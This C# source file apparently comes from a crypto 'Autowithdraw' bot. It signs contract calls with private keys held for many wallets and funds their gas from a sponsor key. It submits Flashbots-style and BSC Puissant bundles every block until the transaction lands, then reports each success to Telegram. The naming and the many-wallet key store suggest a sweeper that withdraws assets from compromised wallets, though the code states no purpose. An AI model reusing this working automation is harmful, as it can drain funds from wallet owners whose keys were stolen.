using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Autowithdraw.Global.Objects;
using Nethereum.Hex.HexTypes;
using Nethereum.JsonRpc.WebSocketStreamingClient;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.RPC.Reactive.Eth.Subscriptions;
using Nethereum.Util;
using Nethereum.Web3;
using Nethereum.Web3.Accounts;
using System;
using System.Collections.Generic;
using System.Numerics;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;

namespace Autowithdraw.Main.Actions
{
    internal class ExecuteTransaction
    {
        public static List<string> Executing = new List<string>();

        public static async Task Starter(
            string Address,
            string ContractAddress,
            string Data,
            int ChainID,
            BigInteger GasLimit)
        {
            Executing.Add(ContractAddress);

            #region Values

            Web3 Account = new Web3(new Account(Settings.Wallets[Address], ChainID),
                Settings.Chains[ChainID].HTTPClient);

            string Link = Settings.Chains[ChainID].Link;

            float Amount = Pricing.GetPriceEther(await Pricing.GetFee(GasLimit, ChainID), ChainID);
            Amount += Amount * 0.1f;
            bool Executed = false;

            #endregion

            await Task.Factory.StartNew(async () =>
            {
                for (int x = 0; x < 5; x++)
                {
                    for (int i = 0; i < 2; i++)
                    {
                        if (Executed)
                            return;
                        await Helper.TransferGas(Address, ChainID, Amount, fromAutoApprove: true);
                        Thread.Sleep(3500);
                    }
                    Thread.Sleep(10000);
                }
            });

            for (int i = 0, x = 0; i < 300 && x < 8200; x++)
            {
                try
                {
                    if (Executed)
                        break;

                    #region Filtering Gas

                    BigInteger AccountWei = (await Account.Eth.GetBalance.SendRequestAsync(Address)).Value - 666;
                    BigInteger GasPrice = AccountWei / GasLimit;
                    if (GasPrice < 0)
                        throw new Exception("Not have balance");

                    #endregion

                    string txHash = await Account.TransactionManager.SendTransactionAsync(new TransactionInput
                    {
                        From = Address,
                        To = ContractAddress,
                        Gas = new HexBigInteger(GasLimit),
                        GasPrice = new HexBigInteger(GasPrice),
                        Data = Data,
                        Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Address,
                            BlockParameter.BlockParameterType.latest)
                    });

                    await Task.Factory.StartNew(async () =>
                    {
                        TransactionReceipt Transaction = await Helper.WaitForTransactionReceipt(txHash, ChainID);
                        if (!Transaction.Succeeded())
                            return;

                        Executed = true;

                        #region Notification

                        await Network.SendTelegram(
                            $"✅ <a href=\"https://{Link}/tx/{txHash}\">Executed Transaction ({Helper.GetMethod(Data)})</a>\n\nWallet: <a href=\"https://{Link}/address/{Address}\">{Address}</a>", ContractAddress, ChainID);

                        #endregion
                    });
                }
                catch (Exception e)
                {
                    if ((Helper.AddNonce(e) && !e.Message.Contains("already known")) || e.Message.Contains("Not have balance"))
                    {
                        Thread.Sleep(50);
                        continue;
                    }
                }

                i++;
                Thread.Sleep(300);
            }
        }

        public static async Task FlashbotsBSC(
            string Address,
            string ContractAddress,
            string Data,
            BigInteger GasLimit,
            string ContractAddress2 = null,
            string Data2 = null,
            BigInteger GasLimit2 = new BigInteger())
        {
            Flashbots.Withdrawing.Add(Address);

            try
            {
                #region Values

                Web3 Account = new Web3(new Account(Settings.Wallets[Address], 56), Settings.Chains[56].HTTPClient);

                Account MainAccount = new Account(Settings.Chains[56].Contract.PrivateKey, 56);
                Web3 Main = new Web3(MainAccount, Settings.Chains[56].HTTPClient);

                BigInteger GasPrice = 60000000000;

                #endregion

                await Task.Factory.StartNew(async () =>
                {
                    #region First Bundle

                    BigInteger Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                        Address, BlockParameter.BlockParameterType.latest);

                    Bundle bundle = new Bundle
                    {
                        jsonrpc = "2.0",
                        id = 48,
                        method = "eth_sendPuissant",
                        @params = new[]
                        {
                            new @params
                            {
                                txs = new List<string>
                                {
                                    "0x" + await MainAccount.TransactionManager.SignTransactionAsync(
                                        new TransactionInput
                                        {
                                            From = MainAccount.Address,
                                            To = Address,
                                            Value = new HexBigInteger(GasLimit * 60000000000 + (!string.IsNullOrEmpty(Data2) ? GasLimit2 * 60000000000 : 0)),
                                            GasPrice = new HexBigInteger(GasPrice),
                                            Nonce = new HexBigInteger(
                                                await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                                    MainAccount.Address,
                                                    BlockParameter.BlockParameterType.latest))
                                        }),
                                    "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                    {
                                        From = Address,
                                        To = ContractAddress,
                                        GasPrice = new HexBigInteger(60000000000),
                                        Gas = new HexBigInteger(GasLimit),
                                        Nonce = new HexBigInteger(Nonce),
                                        Data = Data
                                    })
                                },
                                maxTimestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() + 120
                            }
                        }
                    };

                    if (!string.IsNullOrEmpty(Data2))
                        bundle.@params[0].txs.Add("0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                        {
                            From = Address,
                            To = ContractAddress2,
                            GasPrice = new HexBigInteger(60000000000),
                            Gas = new HexBigInteger(GasLimit2),
                            Nonce = new HexBigInteger(Nonce + 1),
                            Data = Data2
                        }));

                    List<string> txHashes = new List<string>
                        { "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]) };

                    Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://puissant-bsc.bnb48.club"));

                    #endregion

                    #region Notification

                    using StreamingWebSocketClient client = new StreamingWebSocketClient(Settings.Chains[56].WSS);
                    var subscription = new EthNewBlockHeadersObservableSubscription(client);
                    bool subscribed = true;
                    int Tries = 0;

                    subscription.GetSubscriptionDataResponsesAsObservable().Subscribe(async block =>
                    {
                        try
                        {
                            var Block =
                                await Account.Eth.Blocks.GetBlockWithTransactionsByNumber
                                    .SendRequestAsync(block.Number);

                            if (Tries > 20)
                                subscribed = false;
                            Tries++;

                            #region Notification

                            bool Finded = false;
                            string findedHash = "";

                            foreach (Transaction transaction in Block.Transactions)
                            {
                                if (txHashes.Contains(transaction.TransactionHash))
                                {
                                    Finded = true;
                                    findedHash = transaction.TransactionHash;
                                }
                            }

                            if (Finded)
                            {
                                Logger.Debug($"Included in block - {block.Number}");
                                subscribed = false;

                                #region Notification

                                await Network.SendTelegram(
                                    $"✅ <a href=\"https://bscscan.com/tx/{findedHash}\">Executed Transaction ({Helper.GetMethod(Data)})</a>\n\nWallet: <a href=\"https://bscscan.com/address/{Address}\">{Address}</a>", ContractAddress, 56);

                                #endregion

                                return;
                            }

                            #endregion

                            #region Second Bundle

                            Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                Address, BlockParameter.BlockParameterType.latest);

                            bundle.@params[0] = new @params
                            {
                                txs = new List<string>
                                {
                                    "0x" + await MainAccount.TransactionManager.SignTransactionAsync(
                                        new TransactionInput
                                        {
                                            From = MainAccount.Address,
                                            To = Address,
                                            Value = new HexBigInteger(GasLimit * 60000000000 + (!string.IsNullOrEmpty(Data2) ? GasLimit2 * 60000000000 : 0)),
                                            GasPrice = new HexBigInteger(GasPrice),
                                            Nonce = new HexBigInteger(
                                                await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                                    MainAccount.Address,
                                                    BlockParameter.BlockParameterType.latest))
                                        }),
                                    "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                    {
                                        From = Address,
                                        To = ContractAddress,
                                        GasPrice = new HexBigInteger(60000000000),
                                        Gas = new HexBigInteger(GasLimit),
                                        Nonce = new HexBigInteger(Nonce),
                                        Data = Data
                                    })
                                },
                                maxTimestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() + 120
                            };

                            if (!string.IsNullOrEmpty(Data2))
                                bundle.@params[0].txs.Add("0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Address,
                                    To = ContractAddress2,
                                    GasPrice = new HexBigInteger(60000000000),
                                    Gas = new HexBigInteger(GasLimit2),
                                    Nonce = new HexBigInteger(Nonce + 1),
                                    Data = Data2
                                }));

                            Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://puissant-bsc.bnb48.club"));
                            string calculatedHash = "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]);
                            if (!txHashes.Contains(calculatedHash))
                                txHashes.Add(calculatedHash);

                            #endregion

                            Logger.Debug($"Block passed - {block.Number}");
                        }
                        catch (Exception e)
                        {
                            Logger.Error(e);
                        }
                    });

                    await client.StartAsync();
                    await subscription.SubscribeAsync();
                    while (subscribed) await Task.Delay(TimeSpan.FromSeconds(0.1));
                    Logger.Debug($"Unsubcribed {Address}");

                    #endregion
                });
            }
            catch (Exception e)
            {
                Logger.Error(e);
            }
        }

        public static async Task FlashbotsETH(
            string Address,
            string ContractAddress,
            string Data,
            BigInteger GasLimit,
            string ContractAddress2 = null,
            string Data2 = null,
            BigInteger GasLimit2 = new BigInteger())
        {
            try
            {
                #region Values

                Web3 Account = new Web3(new Account(Settings.Wallets[Address], 1),
                    Settings.Chains[1].HTTPClient);
                using StreamingWebSocketClient client = new StreamingWebSocketClient(Settings.Chains[1].WSS);
                var subscription = new EthNewBlockHeadersObservableSubscription(client);
                bool subscribed = true;
                int Tries = 0;

                Account sponsorAccount = new Account(Settings.Chains[1].Contract.PrivateKey, 1);
                Web3 Sponsor = new Web3(sponsorAccount,
                    Settings.Chains[1].HTTPClient);

                BigInteger GasPrice = Web3.Convert.ToWei(20, UnitConversion.EthUnit.Gwei);
                BigInteger MaxGasPrice =
                    GasPrice + (await Settings.Chains[1].Web3.Eth.GasPrice.SendRequestAsync()).Value;

                #endregion

                #region First Bundle

                BigInteger Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Address, BlockParameter.BlockParameterType.latest);

                Bundle bundle = new Bundle
                {
                    jsonrpc = "2.0",
                    id = 1,
                    method = "eth_sendBundle",
                    @params = new[]
                    {
                        new @params
                        {
                            txs = new List<string>
                            {
                                "0x" + await Sponsor.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = sponsorAccount.Address,
                                    To = Address,
                                    Value = new HexBigInteger(GasLimit * MaxGasPrice + (!string.IsNullOrEmpty(Data2) ? GasLimit2 * MaxGasPrice : 0) + 5000),
                                    Nonce = new HexBigInteger(
                                        (await Sponsor.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                            sponsorAccount.Address,
                                            BlockParameter.BlockParameterType.latest)).Value),
                                    GasPrice = new HexBigInteger(MaxGasPrice)
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Address,
                                    To = ContractAddress,
                                    Gas = new HexBigInteger(GasLimit),
                                    Nonce = new HexBigInteger(Nonce),
                                    Data = Data,
                                    GasPrice = new HexBigInteger(MaxGasPrice)
                                })
                            },
                            blockNumber =
                                new HexBigInteger(
                                    (await Account.Eth.Blocks.GetBlockNumber.SendRequestAsync()).Value + 2).HexValue
                        }
                    }
                };
                Console.WriteLine((await Account.Eth.Blocks.GetBlockNumber.SendRequestAsync()).Value + 2);
                Console.WriteLine((await Account.Eth.Blocks.GetBlockNumber.SendRequestAsync()).Value + 2);
                Console.WriteLine((await Account.Eth.Blocks.GetBlockNumber.SendRequestAsync()).Value + 2);
                Console.WriteLine((await Account.Eth.Blocks.GetBlockNumber.SendRequestAsync()).Value + 2);
                if (!string.IsNullOrEmpty(Data2))
                    bundle.@params[0].txs.Add("0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                    {
                        From = Address,
                        To = ContractAddress2,
                        Gas = new HexBigInteger(GasLimit2),
                        Nonce = new HexBigInteger(Nonce + 1),
                        Data = Data2,
                        GasPrice = new HexBigInteger(MaxGasPrice)
                    }));

                List<string> txHashes = new List<string>
                    { "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]) };

                Logger.Debug(JsonSerializer.Serialize(bundle));

                foreach (string RPC in Settings.Config.Other.RPCList)
                {
                    try
                    {
                        Logger.Debug($"{RPC} - " + Network.Post(JsonSerializer.Serialize(bundle), RPC));
                    }
                    catch (Exception e)
                    {
                        Logger.Error(e);
                    }
                }

                #endregion

                #region Notification

                subscription.GetSubscriptionDataResponsesAsObservable().Subscribe(async block =>
                {
                    try
                    {
                        MaxGasPrice = GasPrice + (await Settings.Chains[1].Web3.Eth.GasPrice.SendRequestAsync()).Value;

                        var Block =
                            await Account.Eth.Blocks.GetBlockWithTransactionsByNumber.SendRequestAsync(block.Number);

                        if (Tries > 8)
                            subscribed = false;
                        Tries++;

                        #region Notification

                        bool Finded = false;
                        string findedHash = "";

                        foreach (Transaction transaction in Block.Transactions)
                        {
                            if (txHashes.Contains(transaction.TransactionHash))
                            {
                                Finded = true;
                                findedHash = transaction.TransactionHash;
                            }
                        }

                        if (Finded)
                        {
                            Logger.Debug($"Included in block - {block.Number}");
                            subscribed = false;

                            #region Notification

                            await Network.SendTelegram(
                                $"✅ <a href=\"https://etherscan.io/tx/{findedHash}\">Executed Transaction ({Helper.GetMethod(Data)})</a>\n\nWallet: <a href=\"https://etherscan.io/address/{Address}\">{Address}</a>", ContractAddress, 1);

                            #endregion

                            return;
                        }

                        #endregion

                        Logger.Debug($"Block passed - {block.Number}");

                        for (int i = 1; i < 5; i++)
                        {
                            #region Second Bundle

                            Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Address, BlockParameter.BlockParameterType.latest);

                            bundle.id++;
                            bundle.@params[0] = new @params
                            {
                                txs = new List<string>
                                {
                                    "0x" + await Sponsor.TransactionManager.SignTransactionAsync(new TransactionInput
                                    {
                                        From = sponsorAccount.Address,
                                        To = Address,
                                        Value = new HexBigInteger(GasLimit * MaxGasPrice + (!string.IsNullOrEmpty(Data2) ? GasLimit2 * MaxGasPrice : 0) + 5000),
                                        Nonce = new HexBigInteger(
                                            (await Sponsor.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                                sponsorAccount.Address,
                                                BlockParameter.BlockParameterType.latest)).Value),
                                        GasPrice = new HexBigInteger(MaxGasPrice)
                                    }),
                                    "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                    {
                                        From = Address,
                                        To = ContractAddress,
                                        Gas = new HexBigInteger(GasLimit),
                                        Nonce = new HexBigInteger(Nonce),
                                        Data = Data,
                                        GasPrice = new HexBigInteger(MaxGasPrice)
                                    })
                                },
                                blockNumber = new HexBigInteger(block.Number.Value + i).HexValue
                            };

                            if (!string.IsNullOrEmpty(Data2))
                                bundle.@params[0].txs.Add("0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Address,
                                    To = ContractAddress2,
                                    Gas = new HexBigInteger(GasLimit2),
                                    Nonce = new HexBigInteger(Nonce + 1),
                                    Data = Data2,
                                    GasPrice = new HexBigInteger(MaxGasPrice)
                                }));

                            foreach (string RPC in Settings.Config.Other.RPCList)
                            {
                                try
                                {
                                    Logger.Debug($"{RPC} - " + Network.Post(JsonSerializer.Serialize(bundle), RPC));
                                }
                                catch (Exception e)
                                {
                                    Logger.Error(e);
                                }
                            }

                            //Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://mev-relay.ethermine.org"));
                            string calculatedHash =
                                "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]);
                            if (!txHashes.Contains(calculatedHash))
                                txHashes.Add(calculatedHash);

                            #endregion
                        }
                    }
                    catch (Exception e)
                    {
                        if (e.Message.Contains("transfer amount exceeds balance") ||
                            e.Message.Contains("eth_estimateGas"))
                        {
                            Logger.Error("Not balance");
                            subscribed = false;
                            return;
                        }

                        Logger.Error(e);
                    }
                });

                await client.StartAsync();
                await subscription.SubscribeAsync();
                while (subscribed) await Task.Delay(TimeSpan.FromSeconds(0.1));
                Logger.Debug($"Unsubcribed {Address}");

                #endregion
            }
            catch (Exception e)
            {
                Logger.Error(e);
            }
        }
    }
}
